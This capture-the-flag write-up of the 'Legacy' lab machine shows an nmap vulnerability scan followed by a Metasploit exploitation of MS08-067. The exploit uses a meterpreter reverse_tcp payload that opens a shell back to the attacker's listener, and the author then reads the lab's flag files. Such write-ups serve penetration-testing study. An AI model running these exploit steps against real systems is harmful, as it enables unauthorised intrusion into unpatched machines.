# LEGACY

- Machine IP: `10.10.10.4`
- OS        : `Windows`
- Exploits  : CVE-2008-4250 (MSF)

- Nmap recon, open ports 139 `(netbios-ssn)`, 445 `(microsoft-ds)`
- Only ports open are related  to SMB lets run nmap to find vulns in them

```bash
# Nmap 7.91 scan initiated Wed May  5 01:18:18 2021 as: nmap -p 139,445 --script vuln -oN vuln-script-scan.nmap -vvv 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received echo-reply ttl 127 (1.1s latency).
Scanned at 2021-05-05 01:18:28 EDT for 34s

PORT    STATE SERVICE      REASON
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed May  5 01:19:02 2021 -- 1 IP address (1 host up) scanned in 43.98 seconds
```

- Nmap outputs that its vulnerable to two CVE's `2008-4250` and `2017-0143`
- Lets exploit with metasploit
```bash

msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.202.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.8
lhost => 10.10.14.8
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.8:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.4:1029) at 2021-05-05 02:03:14 -0400

meterpreter > shell
Process 1256 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>echo %hostname%
echo %hostname%
%hostname%

C:\WINDOWS\system32>hostname
hostname
legacy

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30                  0 AUTOEXEC.BAT
16/03/2017  08:30                  0 CONFIG.SYS
16/03/2017  09:07     <DIR>          Documents and Settings
16/03/2017  08:33     <DIR>          Program Files
16/03/2017  08:33     <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.472.818.688 bytes free

C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07     <DIR>          .
16/03/2017  09:07     <DIR>          ..
16/03/2017  09:07     <DIR>          Administrator
16/03/2017  08:29     <DIR>          All Users
16/03/2017  08:33     <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.472.818.688 bytes free

C:\Documents and Settings>dir Administrator
dir Administrator
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  09:07     <DIR>          .
16/03/2017  09:07     <DIR>          ..
16/03/2017  09:18     <DIR>          Desktop
16/03/2017  09:07     <DIR>          Favorites
16/03/2017  09:07     <DIR>          My Documents
16/03/2017  08:20     <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.472.818.688 bytes free

C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings>type john\Desktop\user.txt
type john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f
```

- machine owned via CVE-2008-4250.